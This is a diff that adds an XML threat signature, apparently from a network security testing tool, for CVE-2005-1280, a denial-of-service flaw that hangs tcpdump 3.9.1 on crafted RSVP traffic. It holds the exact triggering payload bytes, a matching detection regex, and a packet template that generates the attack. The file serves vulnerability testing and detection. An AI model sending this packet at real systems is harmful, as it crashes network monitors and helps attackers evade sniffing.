@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="tcpdump RSVP DOS"/>
+    <EngDesc display="true" value="This threat causes tcpdump to enter into an infinite loop while parsing the RSVP protocol.  This can be used by an attacker to evade sniffing attempts."/>
+    <Intent display="true">
+      <item value="Evasion"/>
+      <item value="Implementation_Exploitation"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="RSVP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Tcpdump"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Tcpdump"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Tcpdump_3.9.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/396930"/>
+    <CVEID display="true" value="CVE-2005-1280"/>
+    <bugtraqID display="true" value="13390"/>
+    <OSVDB display="true" value="15904"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001038208561b00c000a80001003c1e314a31"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632776013039687500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X10\X14\X58\XCE\X80\X00\X00\X14\X00\X08\X14\X01\X03\X00\X00\X00\X00\X00\X00\X00\XFF\XFF\XFF\XFF\XFF\XFF\X4A\X0A\XA8\XF3"/>
+    <Created value="1142053711" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0000" TTL="80" Protocol="2E" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="101458CE80000014000814010300000000000000FFFFFFFFFFFF4A0AA8F3" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
